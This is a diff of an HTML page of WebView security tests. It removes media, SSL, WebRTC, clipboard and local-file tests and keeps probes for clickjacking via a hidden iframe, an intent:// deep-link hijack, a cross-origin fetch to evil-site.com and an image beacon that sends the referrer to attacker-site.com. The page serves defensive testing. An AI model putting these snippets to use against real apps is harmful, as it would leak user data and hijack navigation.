@@ -3,94 +3,14 @@
 <head>
     <title>WebView Security Tests</title>
     <script>
-        function testMultipleMediaAccess() {
-            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
-                .then(stream => {
-                    alert('Multiple media access allowed!');
-                    stream.getTracks().forEach(track => track.stop());
-                })
-                .catch(err => alert('Multiple media access denied: ' + err));
-        }
-
-        function testRapidPermissionRequests() {
-            for (let i = 0; i < 10; i++) {
-                navigator.permissions.query({ name: 'camera' }).then(result => {
-                    alert('Permission request ' + (i + 1) + ': ' + result.state);
-                }).catch(err => alert('Permission request error: ' + err));
-            }
-        }
-
-        function testAudioAccess() {
-            navigator.mediaDevices.getUserMedia({ audio: true })
-                .then(stream => {
-                    alert('Audio access allowed!');
-                    stream.getTracks().forEach(track => track.stop());
-                })
-                .catch(err => alert('Audio access denied: ' + err));
-        }
-
-        function testMultipleVideoStreams() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream1 => {
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(stream2 => {
-                            alert('Multiple video streams allowed!');
-                            stream1.getTracks().forEach(track => track.stop());
-                            stream2.getTracks().forEach(track => track.stop());
-                        }).catch(err => alert('Second video stream denied: ' + err));
-                }).catch(err => alert('First video stream denied: ' + err));
-        }
-
-        function testSSLValidation() {
-            fetch('https://self-signed.badssl.com/')
-                .then(res => alert('Accepted invalid SSL certificate!'))
-                .catch(err => alert('SSL validation worked, request blocked: ' + err));
-        }
-
-        function testWebRTCIpLeak() {
-            let peerConnection = new RTCPeerConnection({ iceServers: [] });
-            peerConnection.createDataChannel('test');
-            peerConnection.createOffer().then(offer => {
-                peerConnection.setLocalDescription(offer);
-            });
-            peerConnection.onicecandidate = event => {
-                if (event.candidate) {
-                    alert('Possible WebRTC IP Leak: ' + event.candidate.candidate);
-                }
-            };
-        }
+        window.onload = function() {
+            testClipboardWrite();
+        };
 
         function testClipboardWrite() {
             navigator.clipboard.writeText('Clipboard test data')
                 .then(() => alert('Clipboard write succeeded!'))
                 .catch(err => alert('Clipboard write blocked: ' + err));
-        }
-
-        function testClipboardRead() {
-            navigator.clipboard.readText()
-                .then(text => alert('Clipboard contains: ' + text))
-                .catch(err => alert('Clipboard read blocked: ' + err));
-        }
-
-        function testAutoNavigation() {
-            window.location.href = "https://malicious-site.com";
-        }
-
-        function testJavaScriptInjection() {
-            let script = document.createElement('script');
-            script.innerHTML = "alert('JavaScript injection successful!')";
-            document.body.appendChild(script);
-        }
-
-        function testFileAccess() {
-            fetch('file:///var/mobile/Library/Preferences/com.apple.Preferences.plist')
-                .then(response => response.text())
-                .then(data => alert('File access granted: ' + data.substring(0, 50)))
-                .catch(err => alert('File access denied: ' + err));
-        }
-
-        function testDeepLinkHijack() {
-            window.location.href = "intent://malicious-app#Intent;scheme=https;package=com.android.chrome;end";
         }
 
         function testClickjacking() {
@@ -101,38 +21,32 @@
             frame.style.height = '100%';
             frame.src = "https://malicious-site.com";
             document.body.appendChild(frame);
-            alert('Clickjacking test: Hidden iframe added.');
+            setTimeout(() => alert('Clickjacking test: Hidden iframe added. If you see no visible changes, clickjacking might be possible.'), 2000);
+        }
+
+        function testDeepLinkHijack() {
+            alert('Testing deep link hijack. If your WebView does not block external intents, this may launch another app.');
+            window.location.href = "intent://malicious-app#Intent;scheme=https;package=com.android.chrome;end";
         }
 
         function testCORS() {
             fetch('https://evil-site.com/api/data', { mode: 'no-cors' })
-                .then(res => alert('CORS test: Request went through!'))
-                .catch(err => alert('CORS test: Blocked by policy - ' + err));
+                .then(res => alert('CORS test failed: Request went through! WebView may not be enforcing proper restrictions.'))
+                .catch(err => alert('CORS test passed: Blocked by policy - ' + err));
         }
 
         function testReferrerLeakage() {
             let img = new Image();
-            img.src = "https://attacker-site.com/log?referrer=" + document.referrer;
+            img.src = "https://attacker-site.com/log?referrer=" + encodeURIComponent(document.referrer);
             document.body.appendChild(img);
-            alert('Referrer sent to attacker site: ' + document.referrer);
+            alert('Referrer sent to attacker site: ' + document.referrer + '. If you see a valid referrer, this is a vulnerability.');
         }
     </script>
 </head>
 <body>
     <h2>WebView Security Tests</h2>
-    <button onclick="testMultipleMediaAccess()">Test Multiple Media Access</button>
-    <button onclick="testRapidPermissionRequests()">Test Rapid Permission Requests</button>
-    <button onclick="testAudioAccess()">Test Audio Access</button>
-    <button onclick="testMultipleVideoStreams()">Test Multiple Video Streams</button>
-    <button onclick="testSSLValidation()">Test SSL Spoofing</button>
-    <button onclick="testWebRTCIpLeak()">Test WebRTC Leak</button>
-    <button onclick="testClipboardWrite()">Test Clipboard Write</button>
-    <button onclick="testClipboardRead()">Test Clipboard Read</button>
-    <button onclick="testAutoNavigation()">Test Auto Navigation</button>
-    <button onclick="testJavaScriptInjection()">Test JavaScript Injection</button>
-    <button onclick="testFileAccess()">Test File Access</button>
-    <button onclick="testDeepLinkHijack()">Test Deep Link Hijacking</button>
     <button onclick="testClickjacking()">Test Clickjacking</button>
+    <button onclick="testDeepLinkHijack()">Test Deep Link Hijacking</button>
     <button onclick="testCORS()">Test CORS Security</button>
     <button onclick="testReferrerLeakage()">Test Referrer Leakage</button>
 </body>
